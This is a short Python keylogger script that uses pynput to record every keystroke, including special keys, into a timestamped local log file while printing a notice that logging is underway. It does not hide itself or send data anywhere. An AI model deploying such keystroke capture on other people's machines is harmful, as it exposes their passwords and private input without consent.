from pynput import keyboard
import logging
from datetime import datetime

# Create a unique log file with a timestamp
log_file = f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys (e.g., ctrl, alt, etc.)
        logging.info(f"Special key pressed: {key}")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    print(f"[INFO] Logging keystrokes to: {log_file}")
    listener.join()
